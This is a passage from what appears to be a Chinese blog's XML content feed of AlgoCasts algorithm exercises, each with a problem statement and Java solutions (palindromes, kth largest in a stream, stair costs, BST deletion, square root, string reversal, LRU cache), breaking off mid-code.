<span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>j<span class="token operator">-</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> maxLen<span class="token punctuation">)</span> <span class="token punctuation">{</span>          start <span class="token operator">=</span> i<span class="token punctuation">;</span>          maxLen <span class="token operator">=</span> j <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> start<span class="token operator">+</span>maxLen<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">int</span> <span class="token function">expand</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token operator">--</span>left<span class="token punctuation">;</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// (right-1) - (left+1) + 1</span>    <span class="token keyword">return</span> right <span class="token operator">-</span> left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n^2), Space: O(1)</span>  <span class="token keyword">public</span> String <span class="token function">longestPalindromeExpand</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> maxLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> len1 <span class="token operator">=</span> <span class="token function">expand</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> len2 <span class="token operator">=</span> <span class="token function">expand</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> len <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>len1<span class="token punctuation">,</span> len2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> maxLen<span class="token punctuation">)</span> <span class="token punctuation">{</span>        start <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token punctuation">(</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        maxLen <span class="token operator">=</span> len<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> start<span class="token operator">+</span>maxLen<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据流中第 K 大的元素</title>
      <link href="/2018/12/09/suan-fa/shu-ju-liu-zhong-di-k-da-de-yuan-su/"/>
      <url>/2018/12/09/suan-fa/shu-ju-liu-zhong-di-k-da-de-yuan-su/</url>
      
        <content type="html"><![CDATA[<h2 id="数据流中第-K-大的元素"><a href="#数据流中第-K-大的元素" class="headerlink" title="数据流中第 K 大的元素"></a>数据流中第 K 大的元素</h2><p><strong>问题</strong></p><p>这个题目说的是，你要实现一个类，用来求数据流中第 K 大的元素。你需要实现这个类中的两个函数。第一个是构造函数，它接收一个整数数组以及一个整数 K，<strong>整数数组作为初始数据流</strong>。第二个是 add 函数，接收一个整数表示新流入的数据，然后返回当前第 K 大的元素。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的 K 是 3，初始的数组是：1, 5, 2, 8这时假如调用 add 函数增加一个数字 9，数据流变成：1, 5, 2, 8, 9你要返回第 3 大的元素是 5。假如再调用 add 函数增加一个数字 0，数据流变成：1, 5, 2, 8, 9, 0这时你要返回的第 3 大元素仍然是 5。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">KthLargestElementInStream</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Queue<span class="token operator">&lt;</span>Integer<span class="token operator">></span> minHeap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Time: O(n*log(k))</span>    <span class="token keyword">public</span> <span class="token function">KthLargestElementInStream</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>k <span class="token operator">=</span> k<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Time: O(log(k))</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>minHeap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>        minHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">></span> minHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        minHeap<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        minHeap<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> minHeap<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬楼梯的最小代价</title>
      <link href="/2018/12/09/suan-fa/pa-lou-ti-de-zui-xiao-dai-jie/"/>
      <url>/2018/12/09/suan-fa/pa-lou-ti-de-zui-xiao-dai-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="爬楼梯的最小代价"><a href="#爬楼梯的最小代价" class="headerlink" title="爬楼梯的最小代价"></a>爬楼梯的最小代价</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组，数组中的整数表示爬对应阶楼梯的代价。<strong>你可以从第 0 阶或第 1 阶楼梯开始爬</strong>，每次可以向上爬 1 阶或 2 阶。那么请问，爬完这个楼梯的最小代价是多少？</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的代价数组 c 是：1, 2, 4, 2爬完这个楼梯的最小代价为 4，也就是从第 1 阶（对应的代价为 2）开始，然后爬两阶就爬完了，代价是 2 + 2 = 4。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">minCostClimbingStairs</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cost<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cost <span class="token operator">==</span> null <span class="token operator">||</span> cost<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cost<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> cost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> cost<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> d<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">minCostClimbingStairsO1</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cost<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cost <span class="token operator">==</span> null <span class="token operator">||</span> cost<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cost<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> cost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> first <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> second <span class="token operator">=</span> cost<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cost<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> cur <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> second<span class="token punctuation">)</span> <span class="token operator">+</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      first <span class="token operator">=</span> second<span class="token punctuation">;</span>      second <span class="token operator">=</span> cur<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> second<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉搜索树中删除节点</title>
      <link href="/2018/12/09/suan-fa/er-cha-shu/er-cha-sou-suo-shu-zhong-shan-chu-jie-dian/"/>
      <url>/2018/12/09/suan-fa/er-cha-shu/er-cha-sou-suo-shu-zhong-shan-chu-jie-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉搜索树中删除节点"><a href="#二叉搜索树中删除节点" class="headerlink" title="二叉搜索树中删除节点"></a>二叉搜索树中删除节点</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉搜索树和一个数值，你要删除二叉搜索树上等于这个数值的节点，然后返回处理后的二叉搜索树。 注意，二叉搜索树的节点上没有重复数值，并且要求删除节点后返回的仍然是二叉搜索树。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉搜索树是：<span class="token code keyword">    1</span>   / \  0   4<span class="token code keyword">     / \</span><span class="token code keyword">    2   8</span>给你的数值为 4。删掉 4 这个节点后，可以返回：<span class="token code keyword">    1</span>   / \  0   2<span class="token code keyword">       \</span><span class="token code keyword">        8</span>也可以返回：<span class="token code keyword">    1</span>   / \  0   8<span class="token code keyword">     /</span><span class="token code keyword">    2</span>这两个都是有效的二叉搜索树，返回其中一个即可。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(h), Space: O(h)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">deleteNodeInBST</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">&lt;</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>      root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">deleteNodeInBST</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">></span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>      root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">deleteNodeInBST</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">.</span>right<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      TreeNode leftMax <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>leftMax<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> leftMax <span class="token operator">=</span> leftMax<span class="token punctuation">.</span>right<span class="token punctuation">;</span>      leftMax<span class="token punctuation">.</span>right <span class="token operator">=</span> root<span class="token punctuation">.</span>right<span class="token punctuation">;</span>      root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现平方根函数</title>
      <link href="/2018/12/09/suan-fa/shi-xian-ping-fang-gen-han-shu/"/>
      <url>/2018/12/09/suan-fa/shi-xian-ping-fang-gen-han-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="实现平方根函数"><a href="#实现平方根函数" class="headerlink" title="实现平方根函数"></a>实现平方根函数</h2><p><strong>问题</strong></p><p>这个题目说的是，你要实现一个函数，来计算非负整数 n 的平方根，平方根只需返回整数部分即可。</p><pre class=" language-markdown"><code class="language-markdown">比如，使用你实现的函数来计算 9 的平方根是 3：f(9) = 3由于 8 的平方根是 2 点几，使用你实现的函数只需要返回整数部分 2 即可：f(8) = 2</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(log(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">sqrtBinarySearch</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">long</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">long</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">long</span> mid2 <span class="token operator">=</span> mid <span class="token operator">*</span> mid<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>mid2 <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mid2 <span class="token operator">></span> n<span class="token punctuation">)</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>mid<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>high<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(log(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">sqrtNewton</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">long</span> x <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>x<span class="token operator">*</span>x <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> n<span class="token operator">/</span>x<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>x<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反转字符串</title>
      <link href="/2018/12/09/suan-fa/fan-zhuan-zi-fu-chuan/"/>
      <url>/2018/12/09/suan-fa/fan-zhuan-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个字符串，你要写一个函数左右反转它。然后返回反转后的字符串。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的字符串是：abcde你要返回左右反转后的字符串：edcba</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> String <span class="token function">reverseString</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> c <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> c<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">char</span> tmp <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      c<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      c<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现 LRU 缓存</title>
      <link href="/2018/12/09/suan-fa/shi-xian-lru-huan-cun/"/>
      <url>/2018/12/09/suan-fa/shi-xian-lru-huan-cun/</url>
      
        <content type="html"><![CDATA[<h2 id="实现-LRU-缓存"><a href="#实现-LRU-缓存" class="headerlink" title="实现 LRU 缓存"></a>实现 LRU 缓存</h2><p><strong>问题</strong></p><p>这个题目说的是，你要实现一个 LRU 缓存，提供 get 和 put 两个操作，并且要求两个操作的时间复杂度都是 O(1)。另外为了简单起见，在这个题目中，key 和 value 都是整数值，并且 value 只为正整数。因此在 get 操作中，当 key 不存在时，返回 -1 即可。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LRUCache</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> key<span class="token punctuation">,</span> val<span class="token punctuation">;</span>      Node prev<span class="token punctuation">,</span> next<span class="token punctuation">;</span>      <span class="token function">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> Node prev<span class="token punctuation">,</span> Node next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> val<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>prev <span class="token operator">=</span> prev<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> Node head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Node<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">move2Head</span><span class="token punctuation">(</span>Node cur<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>cur <span class="token operator">==</span> head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        head <span class="token operator">=</span> head<span class="token punctuation">.</span>prev<span class="token punctuation">;</span>        <span class="token 